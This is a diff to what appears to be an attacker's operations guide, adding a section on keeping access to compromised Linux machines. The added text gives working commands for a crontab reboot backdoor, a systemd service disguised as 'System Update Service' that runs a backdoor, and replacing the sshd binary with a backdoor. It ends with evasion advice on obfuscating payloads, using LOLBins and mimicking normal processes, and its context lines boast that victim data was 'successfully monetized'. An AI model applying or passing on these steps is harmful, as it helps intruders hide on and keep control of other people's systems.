@@ -284,7 +284,7 @@ expired=id
 - **14+ days downtime** at time of writing  
 - Data successfully monetized
 
-## C2 Infrastructure Setup
+## 4. C2 Infrastructure Setup
 
 ### Sliver C2 Framework Setup
 
@@ -353,3 +353,82 @@ sliver > listener https --host 192.168.1.10
   - Persistent connection
   - Faster response
   - Easier to detect
+
+## 5. Persistence Techniques
+
+### Overview
+The most effective persistence techniques include:
+1. **Trusted binary hijacking**
+2. **Custom service creation** 
+3. **Crontab entries** (temporary only)
+
+*Note:* Crontab should only be used for quick temporary access. It's easily detected via `crontab -l`.
+
+---
+
+### 1. Crontab Method (Temporary)
+```bash
+# Add persistence
+(crontab -l 2>/dev/null; echo "@reboot /path/to/backdoor") | crontab -
+
+# Verify
+crontab -l
+```
+
+---
+
+### 2. Custom Service Method
+Create service file:
+```bash
+echo "[Unit]
+Description=System Update Service
+[Service]
+ExecStart=/bin/bash /path/to/backdoor.sh
+Restart=always
+[Install]
+WantedBy=multi-user.target" > /etc/systemd/system/sysupdate.service
+```
+
+Enable and start:
+```bash
+systemctl enable sysupdate
+systemctl start sysupdate
+systemctl status sysupdate  # Verify
+```
+
+---
+
+### 3. Binary Hijacking (SSH Example)
+```bash
+# Identify target binary
+which sshd
+
+# Replace binary
+mv /usr/sbin/sshd /usr/sbin/sshd.bak
+cp /path/to/backdoor /usr/sbin/sshd
+chmod +x /usr/sbin/sshd
+
+# Restart service
+systemctl restart sshd
+
+# Add to rc.local for backup
+echo "/usr/sbin/sshd" >> /etc/rc.local
+```
+
+---
+
+### Evasion Techniques
+- **Payload Obfuscation**: 
+  - Encrypt/hash your payloads
+  - Use living-off-the-land binaries (LOLBins)
+  
+- **Communication Security**:
+  - Always use encrypted channels (SSL/TLS)
+  - Implement certificate pinning
+
+- **Behavioral Blending**:
+  - Randomize callbacks times
+  - Mimic normal user/process patterns
+  - Limit CPU/memory usage
+
+*Pro Tip:* Combine multiple methods for resilient persistence while maintaining operational security.
